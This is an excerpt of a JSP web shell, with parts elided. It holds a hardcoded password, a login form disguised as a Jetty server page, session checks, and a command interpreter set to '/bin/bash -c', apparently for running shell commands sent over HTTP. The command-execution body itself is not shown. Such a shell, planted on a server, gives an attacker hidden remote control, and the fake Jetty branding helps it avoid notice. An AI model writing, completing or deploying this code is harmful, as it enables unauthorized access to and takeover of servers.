...
%>
<%!
   private static final String password = "l9%dA$s3U!ji";
%>
<%
String tmpPath = request.getServletPath();
int index = tmpPath.lastIndexOf("/");
String servletPath = tmpPath.substring(index+1);
if(session.isNew()) {
  session.setAttribute("login", "failed");
  out.println("<!DOCTYPE html><body><form action=\"" + servletPath + "\"><label for=\"pwd\">password&nbsp;</label><input type=\"text\" name=\"pwd\"><input type=\"submit\" value=\"submit\"></form><hr><h4>powered by jetty://</h4></body><html></html>"); 
  return;
} else {
  String sessionStatus = (String)session.getAttribute("login");
  if(sessionStatus.equals("failed") || (sessionStatus == null)) {
    String connectPwd = request.getParameter("pwd");
    if(connectPwd == null || (!connectPwd.equals(password))) {
      out.println("<!DOCTYPE html><body><form action=\"" + servletPath + "\"><label for=\"pwd\">password&nbsp;</label><input type=\"text\" name=\"pwd\"><input type=\"submit\" value=\"submit\"></form><hr><h4>powered by jetty://</h4></body><html></html>"); 
      return;
    } else {
...
<%!
   ...
   */
   ...
   private static final String[] COMMAND_INTERPRETER = {"/bin/bash","-c"};    // Unix
